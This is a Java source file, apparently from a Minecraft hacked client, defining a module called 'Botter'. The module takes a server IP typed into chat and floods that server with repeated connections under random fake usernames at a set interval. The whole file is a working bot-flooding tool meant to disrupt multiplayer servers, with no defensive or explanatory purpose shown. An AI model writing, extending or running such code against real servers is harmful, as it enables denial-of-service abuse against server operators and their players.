package slice.module.modules.misc;

import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.util.Session;
import slice.event.data.EventInfo;
import slice.event.events.EventChat;
import slice.event.events.EventUpdate;
import slice.module.Module;
import slice.module.data.Category;
import slice.module.data.ModuleInfo;
import slice.setting.settings.NumberValue;
import slice.util.LoggerUtil;

@SuppressWarnings("all") @ModuleInfo(name = "Botter", description = "Spams a server with disconnections", category = Category.MISC)
public class Botter extends Module {

    private String ip;

    NumberValue delay = new NumberValue("Delay", 1000L, 200L, 5000L, NumberValue.Type.LONG);

    public void onEnable() {
        ip = null;
        LoggerUtil.addMessage("Please enter the IP of the server to bot");
    }

    @EventInfo
    public void onChat(EventChat e) {
        if(ip != null) return;

        String message = e.getMessage();

        e.setCancelled(true);

        ip = message;
    }

    @EventInfo
    public void onUpdate(EventUpdate e) {
        if(ip == null) return;

        if(timer.hasReached(delay.getValue().longValue())) {
            new GuiConnecting(new Session("lol" + (int) Math.floor(Math.random() * 1000), "0", "0", "mojang"), ip);
            timer.reset();
        }
    }
}
